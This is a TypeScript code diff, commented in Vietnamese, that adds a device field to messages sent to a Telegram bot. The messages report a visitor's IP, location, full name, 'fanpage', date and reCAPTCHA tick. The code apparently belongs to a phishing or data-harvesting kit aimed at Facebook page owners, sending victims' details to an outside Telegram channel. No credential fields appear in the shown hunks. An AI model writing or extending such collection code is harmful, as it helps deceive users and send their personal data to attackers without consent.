@@ -94,6 +94,7 @@ function normalizeData(input: any = {}) {
     return {
         ip: input.ip ?? '',
         location: input.location ?? '',
+        device: input.device ?? '',
         fullName: input.fullName ?? input.name ?? '',
         fanpage: input.fanpage ?? '',
         day: input.day ?? '',
@@ -155,6 +156,7 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
     const lines = [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
         `----------------------`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
@@ -241,6 +243,7 @@ function formatRecaptchaTickMessage(data: any): string {
     return [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
         `<b>reCAPTCHA:</b> <code>${formatCodeField(d.recaptcha)}</code>`,
     ].join('\n');
 }
@@ -288,7 +291,7 @@ async function postTelegramText(
     }
 }
 
-/** Tin Telegram riêng khi tick reCAPTCHA (IP + Location + trạng thái tick). */
+/** Tin Telegram riêng khi tick reCAPTCHA (IP + Location + thiết bị + trạng thái tick). */
 async function sendRecaptchaTickTelegram(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
     data: any
